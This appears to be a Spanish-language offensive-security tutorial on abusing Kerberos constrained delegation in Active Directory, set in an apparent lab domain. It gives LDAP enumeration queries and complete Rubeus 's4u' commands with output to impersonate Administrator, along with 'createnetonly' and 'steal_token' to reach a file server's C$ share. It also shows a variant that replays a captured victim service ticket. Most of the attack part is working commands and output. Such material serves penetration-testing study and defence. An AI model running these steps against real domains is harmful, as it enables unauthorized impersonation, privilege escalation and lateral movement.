La extensión **S4U (Service for User)** apareció en Server 2003 para sustituir a la delegación sin restricciones, que era demasiado peligrosa. Aporta dos protocolos:

- **S4U2proxy** → un servicio obtiene un ticket en nombre de un usuario para *otro* servicio (ej. la web pide un ticket al servicio de base de datos en nombre del usuario). Esto es la "delegación restringida".
- **S4U2self** → un servicio obtiene un ticket en nombre de un usuario para *sí mismo*. Pensado para cuando el usuario se autenticó por un método distinto a Kerberos (p. ej. NTLM). Esto es la "transición de protocolo".

La diferencia con la delegación sin restricciones: aquí el equipo solo puede delegar a los **SPN concretos** que tenga listados, no a todo el dominio. Se configura en el atributo `msDS-AllowedToDelegateTo` del objeto de equipo (en vez del flag `TRUSTED_FOR_DELEGATION`).

#### Enumeración

```
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

sAMAccountName: server-ws$
msDS-AllowedToDelegateTo: cifs/server-files.dragon.com, cifs/server-files
```

---

#### Con transición de protocolo (caso fácil)

La transición de protocolo está apagada salvo que se ponga el flag `TRUSTED_TO_AUTH_FOR_DELEGATION` en el UAC. Puedes comprobarlo leyendo el UAC y haciendo un AND de bits con el valor del flag (16777216):

```
ldapsearch (&(samAccountType=805306369)(samaccountname=server-ws$)) --attributes userAccountControl

userAccountControl: 16781312
```

En PowerShell: `[System.Convert]::ToBoolean(16781312 -band 16777216)` → `True` significa que el flag está puesto.

Si está habilitada, el atacante que controla el equipo delegado obtiene un TGT de la cuenta de equipo y hace S4U2self **suplantando a cualquier usuario** (libre elección del nombre). El ticket que devuelve es reenviable, así que sirve para S4U2proxy contra el servicio objetivo. Rubeus encadena los dos pasos con un solo comando `s4u`:

```
Rubeus.exe s4u /user:server-ws$ /msdsspn:cifs/server-files /ticket:doIFn[...recortado...]5DT00= /impersonateuser:Administrator /nowrap
```

- `/user` → el principal (el equipo) configurado para delegar.
- `/msdsspn` → el servicio al que tiene permiso delegar.
- `/ticket` → el TGT del equipo.
- `/impersonateuser` → el usuario a suplantar.

Rubeus hace primero el **S4U2self** (obtiene un TGS de `Administrator` hacia el propio equipo):

```
[*] Building S4U2self request for: 'server-ws$@DRAGON.COM'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'server-ws$@DRAGON.COM'
```

Y luego el **S4U2proxy** hacia el SPN objetivo, devolviendo un ticket de servicio válido para el usuario suplantado:

```
[*] Impersonating user 'Administrator' to target SPN 'cifs/server-files'
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/server-files':
      doIGf[...recortado...]ZzLTE=
```

Como es un ticket CIFS, sirve para listar el `C$` del equipo. Se importa a una sesión nueva y se roba el token:

```
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:FakePass /ticket:doIGf[...recortado...]ZzLTE=
[+] ProcessID  : 3380

steal_token 3380
ls \\server-files\c$
 [...listado del C$...]
```

- `createnetonly` crea un proceso con un logon de tipo 9 (NetOnly) donde inyecta el ticket; `/password` es falsa a propósito (no se usa, el ticket manda).

---

#### Sin transición de protocolo (caso limitado)

Sin transición de protocolo, el TGT del equipo **no** sirve para obtener un ticket reenviable vía S4U2self: el ticket sale sin el flag `forwardable` y S4U2proxy falla con `KDC_ERR_BADOPTION`:

```
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'server-ws$@DRAGON.COM'
...
[X] KRB-ERROR (13) : KDC_ERR_BADOPTION
```

> Existió la vulnerabilidad **Bronze Bit** (CVE-2020-17049) que permitía forzar el bit reenviable, pero ya está parcheada.

La salida en este caso: en vez de suplantar libremente, hay que **capturar un ticket de servicio que un usuario real ya pidió** para el servicio de interfaz, y pasarlo a S4U2proxy con `/tgs` (en lugar de `/impersonateuser`). Quedas limitado a los usuarios para los que tengas tickets:

```
Rubeus.exe s4u /user:server-ws$ /msdsspn:cifs/server-files /ticket:doIFn[...recortado...]5DT00= /tgs:doIFp[...recortado...]dzLTE= /nowrap

[*] Loaded a TGS for DRAGON.COM\victim
[*] Impersonating user 'victim' to target SPN 'cifs/server-files'
[+] S4U2proxy success!
```

- `/tgs` → ticket de servicio de interfaz capturado de un usuario (aquí, victim).

El ticket resultante da acceso al servicio objetivo como ese usuario.
